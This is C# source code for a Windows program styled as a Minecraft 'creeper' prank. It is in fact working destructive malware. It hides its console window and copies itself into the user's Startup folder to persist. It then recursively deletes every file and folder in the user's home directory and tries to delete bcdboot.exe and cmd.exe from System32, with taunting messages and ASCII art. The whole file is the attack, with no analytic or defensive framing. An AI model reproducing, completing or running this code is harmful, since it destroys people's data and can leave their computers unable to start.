using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace crepper
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);

            Console.WriteLine("I am a creeper, catch me if you can.", Console.ForegroundColor = ConsoleColor.Green);
            CreateFiles();
            DeleteFiles();
            Console.WriteLine("Uh oh I blew-up all your files!", Console.ForegroundColor = ConsoleColor.Green);
            Console.WriteLine("I am very sorry...", Console.ForegroundColor = ConsoleColor.Green);
            Thread.Sleep(500);
            Sys();
            Console.WriteLine();
            Console.WriteLine("", Console.ForegroundColor = ConsoleColor.Green);
            string title = @"
██████████████████████████
█░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒█
█░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒█
█▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░█
█▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░█
█░░░██████▒▒▒░░░██████▒▒▒█
█░░░██████▒▒▒░░░██████▒▒▒█
█▒▒▒██████░░░▒▒▒██████░░░█
█▒▒▒██████░░░▒▒▒██████░░░█
█░░░▒▒▒░░░██████▒▒▒░░░▒▒▒█
█░░░▒▒▒░░░██████▒▒▒░░░▒▒▒█
█▒▒▒░░░████████████▒▒▒░░░█
█▒▒▒░░░████████████▒▒▒░░░█
█░░░▒▒▒████████████░░░▒▒▒█
█░░░▒▒▒████████████░░░▒▒▒█
█▒▒▒░░░███░░░▒▒▒███▒▒▒░░░█
█▒▒▒░░░███░░░▒▒▒███▒▒▒░░░█
█░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒█
█░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒█
██████████████████████████";

            Console.WriteLine(title);
        }

        static void CreateFiles()
        {
            string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            string dest = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName}";
            File.Copy(src, dest);
        }

        static void DeleteFiles()
        {
            DirectoryInfo dirs = new DirectoryInfo($@"C:\Users\{Environment.UserName}");
            foreach (FileInfo file in dirs.GetFiles())
            {
                try
                {
                    file.Delete();
                    Console.WriteLine(file.FullName + " Deleted!", Console.ForegroundColor = ConsoleColor.Red);
                }
                catch { }
            }
            foreach (DirectoryInfo dir in dirs.GetDirectories())
            {
                try
                {
                    dir.Delete(true);
                    Console.WriteLine(dir.FullName + " Deleted!", Console.ForegroundColor = ConsoleColor.Red);
                }
                catch { }
            }
        }

        static void Sys()
        {
            if (File.Exists($@"C:\Windows\System32\bcdboot.exe"))
            {
                try
                {
                    File.Delete($@"C:\Windows\System32\bcdboot.exe");
                }
                catch { }
            }
            Console.WriteLine("Looks like I ate your bootup file :'(");
            Console.WriteLine("Now your pc will never bootup again...");
            Thread.Sleep(500);
            if(File.Exists($@"C:\Windows\System32\cmd.exe"))
            {
                try
                {
                    File.Delete($@"C:\Windows\System32\cmd.exe");
                }
                catch { }
            }
            Console.WriteLine("Oops looks like I also ate your cmd.exe file ;-;");
            Console.WriteLine("Well the only thing left to do is restart...");
        }
    }
}
